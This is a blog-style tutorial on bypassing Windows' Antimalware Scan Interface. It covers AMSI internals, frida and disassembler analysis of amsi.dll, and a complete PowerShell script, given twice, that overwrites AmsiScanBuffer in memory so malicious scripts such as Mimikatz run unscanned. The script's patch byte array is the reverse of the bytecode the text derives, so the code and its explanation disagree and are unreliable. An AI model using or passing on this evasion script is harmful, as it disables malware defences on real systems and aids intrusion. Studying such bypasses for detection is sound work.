# AMSI Bypass - Memory Patching

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/logo.png" style="width:90%">
</center>

- [AMSI Bypass - Memory Patching](#amsi-bypass---memory-patching)
  - [AMSI](#amsi)
  - [AMSI Working Mechanism](#amsi-working-mechanism)
  - [AMSI Internals](#amsi-internals)
  - [Debugging amsi.dll](#debugging-amsidll)
  - [Analysing AmsiScanString and AmsiScanBuffer](#analysing-amsiscanstring-and-amsiscanbuffer)
  - [Patching amsi.dll](#patching-amsidll)
  - [References](#references)

## AMSI

AMSI or ```Anti Malware Scan Interface``` is a defensive mechanism used by ```PowerShell, UAC and many more``` to check whether a malicious data is being passed into it or not. It mostly targets the commands and  scripts which are being executed in the PowerShell or other AMSI integrated environment. If it detects any malicious content in it, AMSI terminates the execution and moves it to the ```Windows Defender``` for further analysis

AV softwares are so developed today which has many detection mechanisms to find malwares and threats. But the need for AMSI rises when AV fails to check file less content which completely relies on memory and doesn't land on disk. AV performs detection for files on disk and files attempting to create process. But what if an attacker tries to perform threat controlled in memory via commands or via malicious fileless scripts, thats where AMSI comes into action. AMSI peforms detection for malicious content in commands or fileless scripts

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/1.png" style="width:60%">
</center>

Windows components that integrate with AMSI are,
1. User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
2. PowerShell (scripts, interactive use, and dynamic code evaluation)
3. Windows Script Host (wscript.exe and cscript.exe)
4. JavaScript and VBScript
5. Office VBA macros

For more detailed information on AMSI, refer [here](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)

## AMSI Working Mechanism

Before we get started, we need keep in mind that ```AMSI``` is a ```dynamically loaded``` feature

For example, if we start a ```PowerShell``` process, the AMSI in it is dynamically loaded into the PowerShell process when it is started with the help of ```amsi.dll```

<center>
<img src="https://docs.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg" style="width:80%">
</center>

Whenever a command is passed (or) a fileless content is ran (scripts), the AMSI tries to de-obfuscate the encoded content to the extent of scripting engine (atmost de-obfuscation) so that it can go through it to find malicious keywords using signatures from AV

These AMSI integrated application makes ```RPC calls``` with Windows Defender or other 3rd party AV to process the scanned data. The sole purpose of AMSI is to act as bridge between detection of file less contents and Windows Defender/ AV Softwares

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/2.png" style="width:80%">
</center>

These strings doesn't seem to trigger AMSI while loading our file less content. Lets see how it detects some realtime badass malicious script, ```Mimikatz```

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/3.png" style="width:80%">
</center>

When we try to load Mimikatz into memory, it gets detected by AMSI and raises an alert to the Windows Defender because it has malicious content which got detected before. This gets stored in ```Windows Event Logs``` with the event ID of ```1116```

For more on [Windows Defender AntiVirus Event IDs](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide#windows-defender-av-ids)

To view the logs in Windows Event Viewer, open Event Viewer (```Win + R -> eventvwr.msc```)

```c
Event Viewer -> Application and Services Logs -> Microsoft -> Windows -> Windows Defender -> Operational
```

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/4.png" style="width:80%">
</center>

We can also filter these event logs in PowerShell CLI

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/5.png" style="width:80%">
</center>
<br>
<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/6.png" style="width:80%">
</center>

These detection data from AMSI will be processed by Windows Defender/ AV Softwares for further analytics and triaging

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/7.png" style="width:80%">
</center>

We can see that our previous incident is stored and the threat is removed by Windows Defender

There is an another interesting behaviour of AMSI. AMSI just checks the string/patterns in the memory and flags it as malicious. There are some strings which are considered to be extremely dangerous in the wild which AMSI flags it as malicious on the moment when it is found.

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/8.png" style="width:90%">
</center>

Here ```Invoke-Unknown``` is an undefined cmdlet, which throws an ```CommandNotFoundException``` error when it is called. But in the same way when we call ```Invoke-Mimikatz``` which is not even loaded in the memory, it triggers the AMSI with ```ScriptContainedMaliciousContent``` error

And AMSI flags some of its internal functions as malicious, because attackers might use these functions with their violent intentions to tamper AMSI. So AMSI becomes self reserved and flags these function as malicious too

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/9.png" style="width:80%">
</center>

But these can be easily bypassed by obfuscation techniques in the memory of the process

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/10.png" style="width:80%">
</center>

Here rises a question that why can't we use obfuscation to bypass AMSI everytime. Of course we can bypass AMSI using obfuscation, but that is not reliable everytime. AV signatures gets updated every day for every kind of latest obfuscation. So it is not recommended to prefer obfuscation for longer run.

## AMSI Internals

AMSI Internals can be broadly classified into,

1. Enumerations
2. Functions
3. Interfaces

Enumerations refers to the constants dealt with AMSI and Interfaces are used when communicating Windows Defender/ 3rd party AV from AMSI.
But the core lies within the functions of AMSI which is responsible for detecting and triggering alerts for fileless malwares

For more detailed info on [AMSI Internals](https://docs.microsoft.com/en-us/windows/win32/api/amsi/)

The functions used by AMSI are,

1. **AmsiCloseSession**    - 	Close a session that was opened by AmsiOpenSession.
2. **AmsiInitialize** 	   -    Initialize the AMSI API.
3. **AmsiNotifyOperation** -	Sends to the antimalware provider a notification of an arbitrary operation.
4. **AmsiOpenSession** 	   -    Opens a session within which multiple scan requests can be correlated.
5. **AmsiResultIsMalware** - 	Determines if the result of a scan indicates that the content should be blocked.
6. **AmsiScanBuffer** 	   -    Scans a buffer-full of content for malware.
7. **AmsiScanString** 	   -    Scans a string for malware.
8. **AmsiUninitialize**    -	Remove the instance of the AMSI API that was originally opened by AmsiInitialize

For AMSI, the important functions which deals with the scanning process we need to focus are ```AmsiScanString``` and ```AmsiScanBuffer```

The structure of ```AmsiScanString``` is,

```c
HRESULT AmsiScanString(
  [in]           HAMSICONTEXT amsiContext,
  [in]           LPCWSTR      string,
  [in]           LPCWSTR      contentName,
  [in, optional] HAMSISESSION amsiSession,
  [out]          AMSI_RESULT  *result
);
```

The structure of ```AmsiScanBuffer``` is,

```c
HRESULT AmsiScanBuffer(
  [in]           HAMSICONTEXT amsiContext,
  [in]           PVOID        buffer,
  [in]           ULONG        length,
  [in]           LPCWSTR      contentName,
  [in, optional] HAMSISESSION amsiSession,
  [out]          AMSI_RESULT  *result
);
```

These both functions returns ```S_OK``` if the content is not malicious. Otherwise, it returns an ```HRESULT``` error code. ```AmsiScanString``` calls ```AmsiScanBuffer``` in its own function, which will be explained later.

For more detailed information about [AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) and [AmsiScanString](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanstring)

If the result is malicious, then AMSI calls ```AmsiResultIsMalware``` which blocks the execution of the fileless content.

The ```AmsiResultIsMalware``` returns nothing and its structure is,

```c
void AmsiResultIsMalware(
  [in]  r
);
```

The types of results which the scans from ```AmsiScanString``` or ```AmsiScanBuffer``` produces are,

1. **AMSI_RESULT_CLEAN** - Known good. No detection found, and the result is likely not going to change after a future definition update.
2. **AMSI_RESULT_NOT_DETECTED** - No detection found, but the result might change after a future definition update.
3. **AMSI_RESULT_BLOCKED_BY_ADMIN_START** - Administrator policy blocked this content on this machine (beginning of range).
4. **AMSI_RESULT_BLOCKED_BY_ADMIN_END** - Administrator policy blocked this content on this machine (end of range).
5. **AMSI_RESULT_DETECTED** - Detection found. The content is considered malware and should be blocked.

These are from ```AMSI_RESULT``` which is a part of AMSI Enumeration Constants and its structure is,

```c
typedef enum AMSI_RESULT {
  AMSI_RESULT_CLEAN,
  AMSI_RESULT_NOT_DETECTED,
  AMSI_RESULT_BLOCKED_BY_ADMIN_START,
  AMSI_RESULT_BLOCKED_BY_ADMIN_END,
  AMSI_RESULT_DETECTED
} ;
```

Whatever the content may be or however the function may work, the result from these function determines whether our fileless content is malicious or not. This is ```the key to our AMSI bypass```.

## Debugging amsi.dll

We know that ```amsi.dll``` is responsible for exporting these functions into the process with which AMSI is integrated with. Now lets use ```Process Hacker``` to see how it exports these functions.

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/11.png" style="width:90%">
</center>

The ```amsi.dll``` is loaded into a base address which is not even static and from there it exports all the functions which are required for AMSI. So whatever we try to do for bypassing AMSI should be ```dynamic```

Using ```frida-trace``` to debug Win32 AMSI API Calls and generating output handlers to debug the AMSI functions,

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/12.png" style="width:90%">
</center>

Editing the JS output handlers for the required functions based on their structure format to get detailed debugging data,

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/13.png" style="width:90%">
</center>

Now lets test the debugging data by passing some dummy strings in the PowerShell session,

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/14.png" style="width:90%">
</center>

We can see that our string ```test``` gets scanned by AMSI and produces the result which has its value in ```0x58b084e858```

Changing the result output into ```Memory.readUShort(args[])```, so that it can read the result value from that memory

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/15.png" style="width:90%">
</center>

The structure of ```AMSI_RESULT``` with its corresponding values. So for each scan our result value should lie within 1 to 32768

```c
enum AMSI_RESULT{
            AMSI_RESULT_CLEAN = 0,
            AMSI_RESULT_NOT_DETECTED = 1,
            AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384,
            AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479,
            AMSI_RESULT_DETECTED = 32768
};
```

Now testing with legitimate string patterns should give us ```1```,

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/16.png" style="width:90%">
</center>

Now testing with malicious string patterns should give us ```32768```,

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/17.png" style="width:90%">
</center>

If we somehow able to tamper or patch the value, we can control the AMSI in the current memory and load our malicious scripts

## Analysing AmsiScanString and AmsiScanBuffer

Lets load our ```amsi.dll``` into diassembler and view its instructions,

Disassembling ```AmsiScanString``` 

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/18.png" style="width:60%">
</center>

We can clearly see that ```AmsiScanString``` always load ```AmsiScanBuffer``` when it is invoked

Disassembling ```AmsiScanBuffer```

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/19.png" style="width:60%">
</center>

Seems like these two functions are performing validations on the provided arguments and starts the scan 

But the one thing common on those two functions is the error handling block

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/20.png" style="width:60%">
</center>
<br>
<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/21.png" style="width:60%">
</center>

We can see that the left block performs the scan after all the arguments are validated without error, whereas the right block executes when there is an error in validating the arguments and ends the function

Here this address ```0x80070057``` refers to ```E_INVALIDARG``` which gets stored into ```eax``` and returns as ```HRESULT``` of this function which is then processed as ```AMSI_RESULT_CLEAN```

Reference for [E_INVALIDARG](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/705fb797-2175-4a90-b5a3-3918024b10b8) 

## Patching amsi.dll

```AmsiScanString``` calls ```AmsiScanBuffer```, so if we patch these bytecodes in front of ```AmsiScanBuffer```, ```AmsiScanString``` will also loose its power to detect

So if we use the right side block having ```0x80070057``` value in it before the scan, the function ends without scanning the fileless content and allows us to execute malicious payloads

The instruction in the right side block is,

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/22.png" style="width:60%">
</center>

```c
mov eax, 0x80070057
```

After this we have to perform ```ret``` to exit the function, so the bytecode for these instruction will be ```b857000780c3```

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/23.png" style="width:60%">
</center>

Now we know the bytecode for patching the AMSI, but we cannot patch it everytime with the help of debugger. We need some dynamic code to load it into the memory of PowerShell session to patch the AMSI. 

In order to do that, we need the value of address space for ```amsi.dll``` which is dynamically loaded and from the base address of that DLL we need to extract the address for ```AmsiScanBuffer``` and we need to write our patch bytecodes with the help of ```VirtualProtect```

Lets use ```Pinvoke``` to use Win32 APIs in PowerShell by C#,

```c
$pinvoke_obj = @"
using System;
using System.Runtime.InteropServices;

public class WinApi {
	
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
	
}
"@
```

Loading the pinvoke object using ```Add-Type``` and using obfuscation techniques discussed above to avoid AMSI detection before loading our patch

```c
Add-Type $pinvoke_obj
$amsiDll = [WinApi]::LoadLibrary("ams"+"i.dll")
$funcAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScanB"+"uffer")
$patch = [Byte[]](0xc3,0x80,0x07,0x00,0x57,0xb8)
$out = 0
[WinApi]::VirtualProtect($funcAddr, [uint32]$patch.Length, 0x40, [ref] $out)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $funcAddr, $patch.Length)
[WinApi]::VirtualProtect($funcAddr, [uint32]$patch.Length, $out, [ref] $null)
```

Here we are loading our ```amsi.dll``` with ```LoadLibrary``` and getting the address of the function ```AmsiScanBuffer``` using ```GetProcAddress``` from the DLL. The patch bytecode is being stored into ```$patch```. We are using ```VirtualProtect``` to change the permission and allowing ```System.Runtime.InteropServices.Marshal``` to write our bytecodes into the memory and using VirtualProtect to reset the permissions in the memory

Now we have made our patch dynamic and portable. It can be loaded into any PowerShell memory to patch the AMSI 

The complete patch for AMSI bypass,

```c
$pinvoke_obj = @"
using System;
using System.Runtime.InteropServices;

public class WinApi {
	
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
	
}
"@
Add-Type $pinvoke_obj
$amsiDll = [WinApi]::LoadLibrary("ams"+"i.dll")
$funcAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScanB"+"uffer")
$patch = [Byte[]](0xc3,0x80,0x07,0x00,0x57,0xb8)
$out = 0
[WinApi]::VirtualProtect($funcAddr, [uint32]$patch.Length, 0x40, [ref] $out)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $funcAddr, $patch.Length)
[WinApi]::VirtualProtect($funcAddr, [uint32]$patch.Length, $out, [ref] $null)
```

We have successfully applied patch and bypassed the AMSI detection

<video width="100%" preload="auto" muted controls>
    <source src="https://raw.githubusercontent.com/AidenPearce369/my-CDN/main/AMSI-Memory-Patch/AMSI-Patch.mkv" type="video/mp4"/>
</video>

## References

[https://fluidattacks.com/blog/amsi-bypass/](https://fluidattacks.com/blog/amsi-bypass/)

[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)
